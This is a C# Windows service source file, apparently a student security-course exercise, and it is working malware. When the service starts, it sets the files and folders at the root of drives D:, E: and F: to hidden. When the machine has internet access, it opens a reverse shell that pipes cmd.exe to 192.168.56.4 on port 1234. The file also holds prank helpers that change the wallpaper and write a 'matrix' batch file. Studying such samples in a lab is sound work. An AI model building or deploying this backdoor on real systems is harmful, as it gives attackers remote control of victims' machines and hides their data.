using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace NT230.L21.ANTN_18520263_18520377
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile(" Service started");

            try
            {
                HideAllFile(@"D:\");
                WriteToFile(" Hided all file in D:\\");
            }
            catch (Exception ex) { }

            try
            {
                HideAllFile(@"E:\");
                WriteToFile(" Hided all file in E:\\");
            }
            catch (Exception ex) { }

            try
            {
                HideAllFile(@"F:\");
                WriteToFile(" Hided all file in F:\\");
            }
            catch (Exception ex) { }

            if (IsConnectedToInternet())
            {
                try
                {
                    CreateReverseShell("192.168.56.4", 1234);
                }
                catch (Exception ex) { }
            }
        }

        protected override void OnStop()
        {
        }


        public static void WriteToFile(string Message)
        {
            string path = @"C:\Logs"; //get path
            if (!Directory.Exists(path))
            {
                //Check if path not exists, then create this directory
                Directory.CreateDirectory(path);
            }
            string filepath = path + @"\LogFile_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt"; //create file log with pattern
            if (!File.Exists(filepath))
            {
                //if this file not exists, then create this file.
                using (StreamWriter sw = File.CreateText(filepath))
                    sw.WriteLine(Message);
            }
            else
            {
                //because this file exists, i only write Message to this file
                using (StreamWriter sw = File.AppendText(filepath))
                    sw.WriteLine(Message);
            }
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;
        private static void ChangeWallpaper(string file_name)
        {
            uint flags = 0;
            if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file_name, flags) == 0)
            {
                Console.WriteLine("Error");
            }
        }

        static public bool IsConnectedToInternet()
        {
            try
            {
                WebRequest temp = HttpWebRequest.Create("http://www.google.com");
                temp.GetResponse();
            }
            catch (WebException ex)
            {
                return false;
            }
            return true;
        }
        static StreamWriter streamWriter;
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        private static void CreateReverseShell(String ip, int port)
        {
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void HideAllFile(string path)
        {

            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles();
            DirectoryInfo[] Dirs = d.GetDirectories();
            foreach (FileInfo file in Files)
            {
                file.Attributes = FileAttributes.Hidden;
            }
            foreach (DirectoryInfo dir in Dirs)
            {
                try
                {
                    dir.Attributes = FileAttributes.Hidden;
                }
                catch (Exception e)
                {
                    continue;
                }
            }

        }
        private static void MakeFileMatrix(string path)
        {
            if (!File.Exists(path)) // File not exist
            {
                StreamWriter file = new StreamWriter(path);
                file.WriteLine("@ECHO OFF");
                file.WriteLine("mode 800");
                file.WriteLine("COLOR 02");
                file.WriteLine(":START");
                file.WriteLine("ECHO %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%");
                file.WriteLine("GOTO START");
                file.Flush();
                file.Close();
            }
        }


    }
}
